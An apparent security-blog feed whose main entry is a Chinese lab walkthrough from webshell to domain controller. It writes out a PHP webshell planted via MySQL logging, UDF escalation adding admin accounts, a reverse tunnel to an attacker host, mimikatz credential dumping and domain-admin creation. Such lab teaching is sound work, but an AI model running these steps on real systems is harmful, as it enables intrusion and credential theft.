代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL注入导图</title>
    <link href="http://TimeS0ng.github.io/2018/06/04/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/"/>
    <id>http://TimeS0ng.github.io/2018/06/04/SQL注入导图/</id>
    <published>2018-06-04T03:06:52.000Z</published>
    <updated>2018-12-18T15:32:39.779Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！"><a href="#本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！" class="headerlink" title="本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！"></a>本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！</h4><a id="more"></a>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/20180604110147_oMGlv3_B11A99714D2D907A004073CD49DA4CB6.jpeg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！&quot;&gt;&lt;a href=&quot;#本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！&quot; class=&quot;headerlink&quot; title=&quot;本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！&quot;&gt;&lt;/a&gt;本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>漫谈攻击链--从webshell到域控的奇妙之旅</title>
    <link href="http://TimeS0ng.github.io/2018/06/04/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE-%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/"/>
    <id>http://TimeS0ng.github.io/2018/06/04/漫谈攻击链-从webshell到域控的奇妙之旅/</id>
    <published>2018-06-04T02:52:53.000Z</published>
    <updated>2018-12-18T15:11:57.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00. 引言"></a>0x00. 引言</h2><h4 id="emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"><a href="#emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！" class="headerlink" title="&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"></a>&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。<a href="http://www.freebuf.com/articles/network/172578.html" target="_blank" rel="external">本文已投freebuf，禁止转载！</a></h4><a id="more"></a>
<h2 id="0x01-渗透环境"><a href="#0x01-渗透环境" class="headerlink" title="0x01. 渗透环境"></a>0x01. 渗透环境</h2><h4 id="emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"><a href="#emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。" class="headerlink" title="&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"></a>&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。</h4><h4 id="emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："><a href="#emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：" class="headerlink" title="&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："></a>&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519102901_yt92TP_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02. web渗透"></a>0x02. web渗透</h2><h4 id="emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"><a href="#emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！" class="headerlink" title="&emsp;&emsp;首先打开我们获取的web站点地址http://192.168.1.106 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"></a>&emsp;&emsp;首先打开我们获取的web站点地址<a href="http://192.168.1.106" target="_blank" rel="external">http://192.168.1.106</a> 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519103537_TL8yGs_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519104344_KmT5nJ_Screenshot.jpeg" alt=""></p>
<h4 id="emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。"><a href="#emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。" class="headerlink" title="&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。"></a>&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。</h4><h4 id="emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"><a href="#emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。" class="headerlink" title="&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"></a>&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519105043_4G3NCI_Screenshot.jpeg" alt=""></p>
<h4 id="emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。"><a href="#emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。" class="headerlink" title="&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。"></a>&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110155_HASASl_Screenshot.jpeg" alt=""></p>
<h4 id="拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"><a href="#拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。" class="headerlink" title="拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"></a>拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110834_n7WMwd_Screenshot.jpeg" alt=""></p>
<h4 id="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！"><a href="#大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！" class="headerlink" title="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！"></a>大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set global general_log=&apos;on&apos;;</div><div class="line">set global general_log_file=&apos;G:/apm/apache2/htdocs/config.php&apos;;</div><div class="line">select &quot;&lt;?php ($_=@$_GET[a]).@$_($_POST[&apos;cmd&apos;]); ?&gt;&quot;;</div><div class="line">set global general_log=off;</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519111553_ytsySz_Screenshot.jpeg" alt=""></p>
<h4 id="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"><a href="#既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！" class="headerlink" title="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"></a>既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！</h4><blockquote>
<p>url = <a href="http://192.168.1.106/config.php?a=assert" target="_blank" rel="external">http://192.168.1.106/config.php?a=assert</a>  post=cmd</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519112536_9JPgYj_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-数据库提权"><a href="#0x03-数据库提权" class="headerlink" title="0x03. 数据库提权"></a>0x03. 数据库提权</h2><h4 id="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。"><a href="#既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。" class="headerlink" title="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。"></a>既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。</h4><h4 id="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"><a href="#写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！" class="headerlink" title="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"></a>写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;test&apos;@&apos;%&apos; IDENTIFIED BY &apos;mysqltoor&apos; WITH GRANT OPTION; </div><div class="line">FLUSH PRIVILEGES;</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113453_p5Fe1K_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113558_iSlUo0_Screenshot.jpeg" alt=""></p>
<h4 id="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"><a href="#现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！" class="headerlink" title="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"></a>现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Create Function cmdshell returns string soname &apos;udf.dll&apos;;</div><div class="line">select cmdshell(&apos;net user test admin@123 /add&apos;);</div><div class="line">select cmdshell(&apos;net localgroup administrators /add test&apos;);</div><div class="line">drop function cmdshell;</div><div class="line"></div><div class="line">Create Function open3389 returns string soname &apos;udf.dll&apos;;</div><div class="line">select open3389();</div><div class="line">drop function open3389;</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519114403_RJqz70_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-建立隧道"><a href="#0x04-建立隧道" class="headerlink" title="0x04. 建立隧道"></a>0x04. 建立隧道</h2><h4 id="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"><a href="#虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！" class="headerlink" title="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"></a>虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 攻击者在公网IP上 运行：</div><div class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888  //在公网上侦听1080端口，并把来自1080端口的流量重定向到8888端口</div><div class="line"># 受害者运行:</div><div class="line">ew_for_Win.exe -s rssocks -d [攻击者公网IP] -e 8888   </div><div class="line"># 然后 vim /etc/proxychains.conf 配置代理文件为：</div><div class="line">socks5 [攻击者公网IP] 1080     </div><div class="line"># 最后利用proxychains 执行命令</div><div class="line">proxychains rdesktop [受害者IP]:3389</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120038_IAO2LB_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120254_Dzvr86_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120601_zj3thc_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-密码窃取"><a href="#0x05-密码窃取" class="headerlink" title="0x05. 密码窃取"></a>0x05. 密码窃取</h2><h4 id="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin"><a href="#我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin" class="headerlink" title="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@"></a>我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">sekurlsa::logonpasswords</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519121717_XCuZPm_Screenshot.jpeg" alt=""></p>
<h4 id="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"><a href="#拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！" class="headerlink" title="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"></a>拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 收集域名信息</div><div class="line">net view  						//获取当前组的计算机名字</div><div class="line">net view /domain   			//查看所有域</div><div class="line">ping -n 1 [组计算机明] -4  	//从计算机名获取IP 地址</div><div class="line">net user /domain				//查看域中的用户名</div><div class="line">net group /domain				//查看域组名称</div><div class="line">net group &quot;Domain Admins&quot; /domain     				//查询管理员</div><div class="line">net group &quot;Domain controllers&quot;  /domain           //查询域控</div><div class="line">net group &quot;Domain Computers&quot; /domain				//查询所有计算机名字</div><div class="line">net config Workstation								//查看当前计算机名、全名、用户名、系统版本、工作站域、登录域</div><div class="line">net group &quot;Domain controllers&quot; 						//查看域控制器</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">net user admin Ad123test /add /domain	  			//添加普通域用户</div><div class="line">net group &quot;Domain Admins&quot; admin /add /domain 		//提升到域管理员</div><div class="line">###################################</div></pre></td></tr></table></figure>
